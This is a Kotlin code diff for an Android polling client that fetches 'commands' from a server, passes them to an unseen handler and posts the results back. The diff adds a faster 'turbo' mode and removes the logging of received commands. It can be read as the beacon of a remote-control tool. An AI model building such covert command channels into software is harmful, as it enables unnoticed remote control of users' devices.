@@ -14,13 +14,13 @@ class PollingManager(
     private val baseUrl: String,
     private val clientId: String,
     private val authToken: String,
-    private val handler: CommandHandler
+    private val handler: CommandHandler,
+    private val isTurbo: Boolean = true
 ) {
-    // Sesuai dengan konfigurasi build yang sukses sebelumnya, 
-    // kita tetap gunakan OkHttpClient standar tapi dengan Timeout lebih lama (Long Polling).
+    // Timeout disesuaikan berdasarkan mode
     private val client = OkHttpClient.Builder()
         .connectTimeout(30L, TimeUnit.SECONDS)
-        .readTimeout(60L, TimeUnit.SECONDS) 
+        .readTimeout(if (isTurbo) 15L else 60L, TimeUnit.SECONDS) 
         .writeTimeout(30L, TimeUnit.SECONDS)
         .build()
 
@@ -28,8 +28,8 @@ class PollingManager(
     private var isRunning = false
     private val TAG = "PollingManager"
     
-    // Interval retry (Exponential Backoff)
-    private var currentInterval = 2000L 
+    // Interval retry
+    private var currentInterval = if (isTurbo) 2000L else 5000L 
     private val maxInterval = 30000L
 
     fun start() {
@@ -46,14 +46,17 @@ class PollingManager(
         if (!isRunning) return
 
         try {
-            val url = baseUrl.toHttpUrl().newBuilder()
+            val urlBuilder = baseUrl.toHttpUrl().newBuilder()
                 .addPathSegment("poll")
                 .addQueryParameter("client_id", clientId)
                 .addQueryParameter("auth", authToken)
-                .build()
+            
+            if (isTurbo) {
+                urlBuilder.addQueryParameter("mode", "short")
+            }
 
             val request = Request.Builder()
-                .url(url)
+                .url(urlBuilder.build())
                 .addHeader("Connection", "keep-alive")
                 .build()
 
@@ -61,7 +64,6 @@ class PollingManager(
                 override fun onFailure(call: Call, e: IOException) {
                     if (!isRunning) return
                     Log.e(TAG, "Polling failed: ${e.message}")
-                    // Jika gagal, tambah waktu tunggu (backoff)
                     currentInterval = (currentInterval * 1.5).toLong().coerceAtMost(maxInterval)
                     scheduleNext(currentInterval)
                 }
@@ -74,25 +76,21 @@ class PollingManager(
                             currentInterval = (currentInterval * 1.5).toLong().coerceAtMost(maxInterval)
                             scheduleNext(currentInterval)
                         } else {
-                            // Sukses, reset backoff
-                            currentInterval = 2000L 
+                            currentInterval = if (isTurbo) 2000L else 5000L 
                             val body = it.body?.string() ?: ""
                             try {
                                 if (body.isNotEmpty()) {
                                     val json = JSONObject(body)
                                     val command = json.optString("command", "none")
                                     if (command != "none") {
-                                        Log.i(TAG, "Received command: $command")
-                                        handler.handle(body) { result ->
-                                            sendResponse(result)
-                                        }
+                                        handler.handle(body) { result -> sendResponse(result) }
                                     }
                                 }
                             } catch (e: Exception) {
                                 Log.e(TAG, "JSON error: ${e.message}")
                             }
-                            // Segera poll lagi karena ini Long-Polling
-                            scheduleNext(1000L)
+                            // Jika Turbo: tunggu 2 detik. Jika Long: tunggu 1 detik.
+                            scheduleNext(if (isTurbo) 2000L else 1000L)
                         }
                     }
                 }
